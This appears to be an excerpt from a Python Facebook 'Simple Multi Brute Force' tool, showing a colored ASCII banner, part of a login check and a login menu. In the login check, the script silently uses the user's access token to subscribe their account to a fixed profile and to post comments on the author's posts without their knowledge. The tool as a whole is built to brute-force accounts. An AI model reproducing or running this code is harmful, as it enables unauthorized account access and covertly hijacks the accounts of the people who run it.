...
logo = """
 \x1b[0;90m____                     __           ___  
\x1b[0;90m/\  _`\                  /\ \        /'___\ 
\x1b[0;90m\ \,\L\_\     ___ ___    \ \ \____  /\ \__/ 
 \x1b[0;92m\/_\__ \   /' __` __`\   \ \ '__`\ \ \ ,__\
   \x1b[0;96m/\ \L\ \ /\ \/\ \/\ \   \ \ \L\ \ \ \ \_/
   \x1b[0;96m\ `\____\\ \_\ \_\ \_\   \ \_,__/  \ \_\ 
    \x1b[0;96m\/_____/ \/_/\/_/\/_/    \/___/    \/_/
    \x1b[0;45m[ Simple Multi Brute Force ]\x1b[0;35m
    \x1b[0;91m[ \x1b[0;93mRekode >> \x1b[0;35mLiaCanss & Hikmat \x1b[0;91m]
    \x1b[0;35m[ \x1b[0;37mAuthor >> \x1b[0;34mRozhakGans \x1b[0;35m]
"""
...
def cek_login():
	...
	kom = kata+love+'\n'+pantun+'\n'+waktu
        ...
        requests.post('https://graph.facebook.com/924552875165817/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/10159090813023544/comments/?message=' +kom+ '&access_token=' + toket)
        ...
        requests.post('https://graph.facebook.com/924552875165817/comments/?message=Mantap Bang ❤️&access_token=' + toket)
...
def login():
    ...
    #print(' [3] Login Menggunakan Token')
    print(' [0] Keluar')
    lg = raw_input('\n [*] Input : ')
    if lg == '':
        os.sys.exit()
